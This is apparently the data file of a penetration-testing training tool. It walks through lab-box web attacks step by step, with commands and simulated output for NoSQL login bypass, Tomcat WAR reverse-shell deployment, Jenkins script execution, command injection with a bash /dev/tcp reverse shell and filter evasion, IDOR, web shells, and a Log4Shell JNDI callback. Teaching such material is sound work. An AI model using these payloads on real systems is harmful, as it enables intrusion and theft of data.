      leadup: [{"key":"stack","label":"A Mongo-backed stack","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Fingerprint the backend","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/ | grep -i x-powered-by","out":"X-Powered-By: Express","sig":"X-Powered-By: Express","teach":"Express very often fronts MongoDB, so a JSON login on this stack is a prime target for operator-object injection."}]},{"key":"error","label":"A telltale error","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Provoke a database error","tool":"curl","where":"local","cmd":"curl -s 'http://<target>/search?q[%24gt]='","out":"CastError: Cast to string failed for value \"{ '$gt': '' }\"\n    at model.Query.exec (/app/node_modules/mongoose/...)","sig":"mongoose","teach":"A Mongoose stack trace confirms a NoSQL backend and, crucially, that query operators like $gt reach the database."}]}],
      why: "This is one of the fastest auth bypasses there is, so it belongs at the very top of your list the moment a login talks to MongoDB or takes JSON where a string belongs. Test it before you even consider brute-forcing, because a single operator object can log you in as admin with nothing to guess. The habit worth building is spotting the backend quickly, since the whole attack only applies where the datastore is NoSQL.",
      cmd: "curl -s -i -X POST http://10.10.10.10/login -d 'user[$ne]=x&pass[$ne]=x'", tool: 'curl',
      output: [
        'HTTP/1.1 302 Found',
        'Location: /dashboard',
        'Set-Cookie: session=loggedin-as-admin; Path=/',
      ].join('\n'),
      signal: 'Set-Cookie: session=loggedin-as-admin; Path=/',
      teach: 'NoSQL backends like MongoDB take query operators as input. {"$ne":"x"} means "not equal to x" (always true), so the login matches the first user and you are in without a password. Test JSON and array parameters against NoSQL apps.',
    },
    'tomcat-deploy': {
      leadup: [{"key":"manager","label":"An exposed manager","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 9.0.30)","sig":"8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 9.0.30)","teach":"The interesting service is not the plain web server but what is listening alongside it."},{"title":"Check for the manager app","tool":"curl","where":"local","cmd":"curl -s -o /dev/null -w '%{http_code}\\n' http://<target>:8080/manager/html","out":"401","sig":"401","teach":"A 401 on /manager/html means the manager is present and only a password stands between you and deploying a WAR shell."}]},{"key":"errorpage","label":"A version-leaking 404","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1","sig":"8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1","teach":"The interesting service is not the plain web server but what is listening alongside it."},{"title":"Read a 404 page","tool":"curl","where":"local","cmd":"curl -s http://<target>:8080/nope","out":"<h3>Apache Tomcat/9.0.30</h3>","sig":"Apache Tomcat/9.0.30","teach":"Tomcat's default 404 prints its exact version, which tells you the manager path and any version-specific default credentials worth trying."}]}],
      why: "A reachable Tomcat Manager plus any valid credential is code execution: you deploy a WAR webshell and it runs as the Tomcat service account. The credentials come from defaults (tomcat:tomcat, admin:admin) or from a tomcat-users.xml you read through LFI. Reach for it whenever you see Tomcat and have, or can guess, manager creds. Build the WAR on your own box first; \"OK - Deployed\" means your shell is live and waiting.",
      signal: 'OK - Deployed application at context path [/shell]',
      teach: 'Tomcat Manager with valid creds lets you deploy a WAR (your own app) which runs as the Tomcat service account. First build the WAR on your box, then upload it; "OK - Deployed" means your JSP shell is live at /shell. Request it to get code execution.',
      steps: [
        { where: 'local', tool: 'msfvenom', cmd: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o rev.war', output: [
          'Payload size: 1098 bytes',
          'Final size of war file: 1098 bytes',
          'Saved as: rev.war',
        ].join('\n') },
        { where: 'local', tool: 'curl', cmd: "curl -u 'tomcat:s3cret' 'http://10.10.10.10:8080/manager/text/deploy?path=/shell' --upload-file rev.war", output: 'OK - Deployed application at context path [/shell]' },
      ],
    },
    'jenkins-access': {
      leadup: [{"key":"portscan","label":"A CI server on 8080","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n8080/tcp open  http    Jetty 9.4.z (Jenkins 2.222.1)","sig":"8080/tcp open  http    Jetty 9.4.z (Jenkins 2.222.1)","teach":"The interesting service is not the plain web server but what is listening alongside it."},{"title":"Confirm Jenkins","tool":"curl","where":"local","cmd":"curl -s -i http://<target>:8080/login | grep -iE \"jenkins|x-jenkins\"","out":"X-Jenkins: 2.222.1\n<title>Sign in [Jenkins]</title>","sig":"X-Jenkins: 2.222.1","teach":"The X-Jenkins header names the version; the Script Console behind that login runs Groovy, which is direct code execution."}]},{"key":"pathproxy","label":"Behind a /jenkins path","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Probe a common path","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/jenkins/ | grep -i x-jenkins","out":"X-Jenkins: 2.222.1","sig":"X-Jenkins: 2.222.1","teach":"Jenkins is often reverse-proxied under /jenkins on port 80, so probe that path even when 8080 is filtered from outside."}]}],
      why: "Jenkins is a build server, so running code is its whole job, which means any near-admin access is a shell: the Groovy Script Console runs as the Jenkins user, and so does a build step. Even unauthenticated instances leak secrets and job configs. Reach for it whenever 8080 shows Jenkins; check for no-auth access first, then the Script Console. On Windows build nodes this is frequently your foothold onto the domain.",
      cmd: "curl -s http://10.10.10.10:8080/script --data-urlencode 'script=println \"id\".execute().text'", tool: 'curl',
      output: [
        'uid=0(root) gid=0(root) groups=0(root)',
      ].join('\n'),
      signal: 'uid=0(root) gid=0(root) groups=0(root)',
      teach: 'Jenkins\' Script Console runs arbitrary Groovy as the Jenkins service, often root or a privileged build account. If /script is reachable, it is remote code execution by design. CI servers are high-value: they hold credentials and run privileged.',
    },
    'wordpress': {
      leadup: [{"key":"whatweb","label":"A fingerprint","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Fingerprint the app","tool":"whatweb","where":"local","cmd":"whatweb http://<target>","out":"http://<target> [200 OK] WordPress[6.4.2], MetaGenerator[WordPress 6.4.2], PHP[8.1]","sig":"WordPress[6.4.2]","teach":"A WordPress version is a map: enumerate users and plugins, then match the versions against known-vulnerable plugin CVEs."}]},{"key":"loginpage","label":"The login page","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find wp-login","tool":"curl","where":"local","cmd":"curl -s -o /dev/null -w '%{http_code}\\n' http://<target>/wp-login.php","out":"200","sig":"200","teach":"A live /wp-login.php confirms WordPress and gives you the user-enumeration and brute-force surface wpscan drives."}]}],
      why: "WordPress core is usually solid; its plugins and themes are not, so the game is enumeration, list the plugins, themes, users and versions with wpscan, then match a version to a known CVE. With admin credentials you skip straight to code execution by editing a theme file or uploading a plugin zip. Reach for it the instant you fingerprint WordPress, and map the third-party plugins first, because the vulnerable plugin is almost always the way in.",
      cmd: 'wpscan --url http://10.10.10.10 --enumerate u,vp --api-token $WPSCAN_API', tool: 'wpscan',
      output: [
        '[+] URL: http://10.10.10.10/  [10.10.10.10]',
        '[+] WordPress version 5.8.1 identified',
        '[+] WPScan found a vulnerable plugin: wp-file-manager 6.0 (CVE-2020-25213, RCE)',
        '[i] User(s) Identified: admin, editor',
      ].join('\n'),
      signal: '[+] WPScan found a vulnerable plugin: wp-file-manager 6.0 (CVE-2020-25213, RCE)',
      teach: 'wpscan maps a WordPress site: core version, plugins, and users. Plugins are where WordPress boxes fall, a vulnerable one like wp-file-manager is often a direct RCE. The enumerated users feed a login brute if you need one.',
    },
    'nikto-scan': {
      leadup: [{"key":"scan","label":"From the port scan","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."}]}],
      why: "Nikto is a shotgun: it checks thousands of known-bad files, stale server versions, and default apps that targeted content discovery can miss. The tradeoff is that it is slow and very loud, so fire it early and let it run in the background while you work the app by hand, not as something you sit and wait on. Read its output as leads to verify, not as findings, it false-positives, and a noisy scan never replaces looking at the site yourself.",
      cmd: 'nikto -h http://10.10.10.10 -o scans/nikto.txt', tool: 'nikto',
      output: [
        '+ Server: Apache/2.4.49 (Unix)',
        '+ /admin/: This might be interesting.',
        '+ OSVDB-3233: /icons/README: Apache default file found.',
        '+ /cgi-bin/: Directory indexing found.',
      ].join('\n'),
      signal: '+ /admin/: This might be interesting.',
      teach: 'Nikto is a fast first pass that flags the obvious, default files, an exposed /admin, a dated banner. Treat each hit as a lead to chase by hand, not a finding on its own.',
    },
    'command-injection': {
      leadup: [{"key":"tool","label":"A diagnostic tool","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a feature that shells out","tool":"curl","where":"local","cmd":"curl -s http://<target>/ | grep -iE 'ping|nslookup|traceroute|convert'","out":"<form action=\"/tools/ping.php\" method=\"get\"><input name=\"host\"></form>","sig":"action=\"/tools/ping.php\"","teach":"A ping, lookup, or convert feature almost always shells out, so its parameter is a command-injection candidate."}]},{"key":"cgi","label":"A cgi-bin script","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Brute-force the paths","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"200      GET  /cgi-bin/status.sh\n200      GET  /admin/exec.php","sig":"200      GET  /cgi-bin/status.sh","teach":"cgi-bin scripts and exec/cmd endpoints run OS commands directly, so they are the first place to test for injection."}]}],
      how: {"lead":"Confirm execution safely first, then escalate to a real shell. The order matters, understand the context before you fire a payload:","items":[{"t":"Pick a separator that fits the context","d":"Chain with ; (run both), && (run if the first succeeds), | (pipe into your command), or a newline. If your input lands inside quotes, break out first: '; id or \"; id. Try a few, one usually survives the app's parsing."},{"t":"Confirm blind execution out-of-band","d":"When nothing comes back in the response, prove it another way: ; ping -c1 <you> while watching tcpdump, or ; curl http://<you>/$(whoami) and read your web log. A callback confirms RCE even when the page stays silent."},{"t":"Enumerate before you shell","d":"Run id, hostname, and uname -a (or whoami on Windows) first, so you know who you are and what the box is before committing to a reverse shell that may behave differently than you expect."},{"t":"Beat shallow input filters","d":"If spaces are blocked, use ${IFS} or <>; if a keyword is filtered, split it (w''hoami) or smuggle it base64-encoded: echo d2hvYW1p | base64 -d | sh. Command-injection filters are usually thin and easy to slip past."},{"t":"Go for the reverse shell","d":"Once confirmed, inject a one-liner with a listener already waiting: bash -i >& /dev/tcp/<you>/<port> 0>&1, or a Python or nc fallback when bash is missing. URL-encode the payload so it survives the HTTP request intact."}]},
      why: "Command injection is the most direct road to RCE there is: no memory corruption, no exploit to port, just the server running whatever you append. That reliability is why any feature that plausibly shells out (a ping tool, a converter, a report generator) earns a quick probe ahead of slower avenues. The discipline that separates a clean win from a wrecked box is confirming the context with a harmless probe first, above all for the blind variants where nothing comes back, so you are not firing a shell payload into a sink you do not understand.",
      cmd: "curl -s 'http://10.10.10.10/ping.php?ip=127.0.0.1;id'", tool: 'curl',
      output: [
        'PING 127.0.0.1 (127.0.0.1): 56 data bytes',
        '64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.04 ms',
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      ].join('\n'),
      signal: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      teach: 'The app ran your ;id alongside its ping, the uid=www-data line is the web server executing your command. That is command injection, and it is a direct path to a reverse shell as the web user.',
    },
    'idor': {
      leadup: [{"key":"numeric","label":"A numeric id in the URL","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Notice the object id","tool":"curl","where":"local","cmd":"curl -s -b session=mine http://<target>/account?id=1001","out":"{\"id\":1001,\"name\":\"you\",\"email\":\"you@corp.local\",\"plan\":\"pro\"}","sig":"\"id\":1001","teach":"A resource addressed by a sequential id is begging to be swapped for someone else's number."}]},{"key":"api","label":"A REST API path","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Map the API","tool":"curl","where":"local","cmd":"curl -s -b session=mine http://<target>/api/users/5","out":"{\"id\":5,\"email\":\"you@corp.local\",\"role\":\"user\"}","sig":"you@corp.local","teach":"REST paths like /api/users/<id> are IDOR-prone: request a neighbour's id while logged in as yourself and see if it answers."}]}],
      why: "IDOR is the best reward-to-effort bug on the web: no payload, no tooling, just changing a number while logged in as someone else, and it routinely exposes other users' data or whole admin functions. That is why it is worth checking on every object reference instead of saving for later. Carry the mindset that access control is a question the server must answer on every request, and the place it is most often forgotten is the second, third, and hundredth object, which is how one IDOR enumerates into a breach.",
      cmd: "curl -s 'http://10.10.10.10/account?id=1002' -H 'Cookie: session=<yours>'", tool: 'curl',
      output: [
        '{"id":1002,"name":"Alice Renner","email":"alice@acme.internal",',
        ' "role":"customer","card_last4":"4417","balance":"42.10"}',
      ].join('\n'),
      signal: '{"id":1002,"name":"Alice Renner","email":"alice@acme.internal",',
      teach: 'You changed id=1001 (yours) to id=1002 and got someone else\'s record, an Insecure Direct Object Reference. The app checks that you are logged in, but not that the object is yours. Walk the IDs to harvest other users\' data.',
    },
    'verb-tampering': {
      leadup: [{"key":"forbidden","label":"A 403 to bypass","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Hit a protected path","tool":"curl","where":"local","cmd":"curl -s -o /dev/null -w '%{http_code}\\n' http://<target>/admin/","out":"403","sig":"403","teach":"A 403 that only guards GET is the opening: the access rule may ignore other verbs, so POST, HEAD, or an arbitrary method can slip past it."}]},{"key":"options","label":"An OPTIONS probe","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Ask which methods are allowed","tool":"curl","where":"local","cmd":"curl -s -i -X OPTIONS http://<target>/admin/ | grep -i allow","out":"Allow: GET, POST, PUT, HEAD, OPTIONS","sig":"Allow: GET, POST, PUT, HEAD, OPTIONS","teach":"An Allow header advertising PUT on a protected path is an invitation: the access rule may only cover GET."}]}],
      why: "Access rules are frequently written for GET and POST only, so hitting the same protected URL with HEAD, PUT, OPTIONS, or PATCH can walk straight past the check. OPTIONS also tells you which verbs the server allows, and a permitted PUT can let you upload a shell outright. Reach for it when a path is forbidden (401/403) but looks important; it is a thirty-second test that now and then hands you the whole thing.",
      cmd: 'curl -s -X OPTIONS -i http://10.10.10.10/admin/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Allow: GET, POST, PUT, OPTIONS',
      ].join('\n'),
      signal: 'Allow: GET, POST, PUT, OPTIONS',
      teach: 'OPTIONS tells you which verbs the server accepts. PUT in the list on /admin/ is a red flag, you may be able to upload a web shell with a PUT, no injection needed. Enumerate methods before assuming a path is locked down.',
    },
    'web-shells': {
      leadup: [{"key":"fromupload","label":"From a file upload","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Brute-force the paths","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"200      GET  /index.html\n200      GET  /product.php\n200      GET  /upload.php","sig":"200      GET  /product.php","teach":"Content discovery maps the real pages; each dynamic one (product.php, upload.php) is a surface to attack in turn."},{"title":"Land a webshell","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/uploads/shell.php?c=id\"","out":"uid=33(www-data) gid=33(www-data) groups=33(www-data)","sig":"uid=33(www-data)","teach":"The upload executes, so you already have command execution; the job now is upgrading this one-shot webshell to an interactive reverse shell."}]},{"key":"fromrce","label":"From another RCE","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Already have command exec","tool":"curl","where":"local","cmd":"curl -s \"http://<target>/tools/ping.php?host=;id\"","out":"uid=33(www-data) gid=33(www-data)","sig":"uid=33(www-data)","teach":"Command injection or a SQLi INTO OUTFILE already gave you execution; a web shell makes that foothold persistent and easier to drive."}]}],
      why: "Once you can write a file into the webroot, through an upload, LFI-to-log, a SQL OUTFILE, or a PUT, you still need a shell file that matches the server's language, and Kali ships vetted ones (Laudanum, the webshells collection). This step is about picking the right payload for the stack, php versus aspx versus jsp, so your write actually executes. Reach for it the moment you hold a write primitive, and prefer a minimal webshell: you only need enough to catch a proper reverse shell.",
      cmd: "curl -s 'http://10.10.10.10/uploads/cmd.php?c=id'", tool: 'curl',
      output: [
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      ].join('\n'),
      signal: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      teach: 'Once your uploaded web shell runs commands (?c=id returns www-data), you have code execution, but one command per request is clumsy. The very next move is to turn it into a proper interactive reverse shell.',
    },
    'xss-basics': {
      leadup: [{"key":"reflected","label":"A reflected search","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Test the search box","tool":"curl","where":"local","cmd":"curl -s 'http://<target>/search?q=oboltest123'","out":"<p>No results for <b>oboltest123</b></p>","sig":"oboltest123","teach":"Your input came back verbatim in the HTML; if it is not encoded, a script payload in q= will execute in the victim's browser."}]},{"key":"stored","label":"A stored comment","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a place that saves input","tool":"curl","where":"local","cmd":"curl -s http://<target>/post/1 | grep -iE 'comment|name='","out":"<form action=\"/post/1/comment\"><textarea name=\"body\"></textarea></form>","sig":"action=\"/post/1/comment\"","teach":"A comment or profile field that other users later view is a stored-XSS surface, which hits every visitor, not just one you phish."}]}],
      why: "On a lab box XSS is rarely the goal itself; it is a way to steal an admin's session or make their browser fetch something only they can reach. So the real question is not \"does it pop an alert\" but \"is there a privileged user who will view my payload\". Reach for it when the app has an admin who reviews user content, a support ticket, a comment, a profile field. Without a victim to trigger it, stored XSS is a dead end, spend your time elsewhere.",
      cmd: "curl -s 'http://10.10.10.10/search.php?q=<b>xssprobe123</b>'", tool: 'curl',
      output: [
        '<p>No results for <b>xssprobe123</b></p>',
      ].join('\n'),
      signal: '<p>No results for <b>xssprobe123</b></p>',
      teach: 'Your <b> tag came back rendered, not escaped, the page reflects input into HTML unsanitised. That is reflected XSS: it runs in a victim\'s browser, useful for stealing a session. On OSCP it matters most where it can reach an admin.',
    },
    'check-log4shell': {
      leadup: [{"key":"input","label":"A logged input","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find a field that reaches the logs","tool":"curl","where":"local","cmd":"curl -s -i http://<target>/ -H 'User-Agent: obol-probe' | grep -iE 'java|jsp|x-powered-by'","out":"X-Powered-By: Servlet/3.1 JSP/2.3 (Apache Tomcat)","sig":"JSP/2.3","teach":"A Java/JSP stack is the precondition for Log4Shell; any header or field the app logs (User-Agent, X-Forwarded-For) is a candidate sink."}]},{"key":"vulnapp","label":"A known-vulnerable app","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Fingerprint the app","tool":"whatweb","where":"local","cmd":"whatweb http://<target>","out":"http://<target> [200 OK] Apache-Solr[8.3.0], Java","sig":"Apache-Solr[8.3.0]","teach":"Products like Solr, vCenter and Unifi bundled Log4j; a vulnerable version is a direct Log4Shell lead before you even hunt for a logged field."}]}],
      why: "Log4Shell is worth a quick spray on any Java app because the check is cheap and the payoff is pre-auth RCE: a vulnerable Log4j resolves a ${jndi:ldap://you/} string you place in a header or field and calls back to your server. You confirm it out-of-band by watching a listener, no callback means no bug. Reach for it when the stack is Java and the box feels dated. It is a CVE, not a design flaw, so it is a yes/no check, not an exploration.",
      signal: 'Received LDAP query from 10.10.10.10 for object /a',
      teach: 'Log4Shell (CVE-2021-44228) triggers when a vulnerable Log4j logs your ${jndi:ldap://...} string and dutifully connects out to it. Stand up a listener first, then inject the string, the inbound LDAP hit confirms the callback, the first step before staging a full exploit.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'nc -lvnp 1389', output: 'Listening on 0.0.0.0 1389' },
        { where: 'local', tool: 'curl', cmd: "curl -sSkL http://10.10.10.10/ -H 'User-Agent: ${jndi:ldap://10.10.14.5:1389/a}'", output: [
          '↩ the target logged the string and connected back:',
          'Received LDAP query from 10.10.10.10 for object /a',
        ].join('\n') },
      ],
    },
    'check-struts2': {
      leadup: [{"key":"extension","label":"A .action endpoint","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Fingerprint Struts","tool":"curl","where":"local","cmd":"curl -s -o /dev/null -w '%{http_code}\\n' http://<target>/login.action","out":"200","sig":"200","teach":"A live .action (or .do) URL is the Struts2 tell; the Content-Type OGNL check is worth a single request once you see one."}]},{"key":"dopage","label":"A .do action","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Try a Struts extension","tool":"curl","where":"local","cmd":"curl -s -o /dev/null -w '%{http_code}\\n' http://<target>/index.do","out":"200","sig":"200","teach":"Struts maps .do as well as .action; either extension responding is reason enough to fire the one-request OGNL check."}]}],
      why: "This is a run-it-first check: once a target fingerprints as Struts2, one request either returns command output or it does not, so it costs seconds and either wins the box outright or is ruled out. Prioritise it over slower, noisier attacks the instant the stack matches, because pre-auth RCE from a single curl is as good as web exploitation gets. Its in-band nature is the gift, you are never left guessing whether it worked, which makes it a confidence-building opening play rather than a time sink.",
      cmd: 'curl -sSk http://10.10.10.10/ -H "Content-Type: %{(#cmd=\'id\')...OGNL...}"', tool: 'curl',
      output: [
        'uid=0(root) gid=0(root) groups=0(root)',
      ].join('\n'),
      signal: 'uid=0(root) gid=0(root) groups=0(root)',
      teach: 'Apache Struts2 OGNL injection (e.g. CVE-2017-5638) evaluates an attacker expression in the Content-Type header and runs commands, here as root. A dated Struts app is often a one-request shell; fingerprint the framework version first.',
    },

    // ============================ SERVICE & WEB CHECKS ============================
    'check-tls-config': {
      why: "This is a free report finding, not an exploit. An expired or self-signed certificate and old protocols like SSLv3 or TLS 1.0 are low-severity but real, and nmap's ssl scripts read them without touching the app. Run it on any TLS service when you want to round out the findings section; it costs nothing and never risks the box. Do not expect a foothold from it, expect a defensible bullet point in the report.",
      cmd: 'nmap --script ssl-cert,ssl-enum-ciphers -p 443 10.10.10.10', tool: 'nmap',
      output: [
        '| ssl-cert: Subject: commonName=dev.acme.internal',
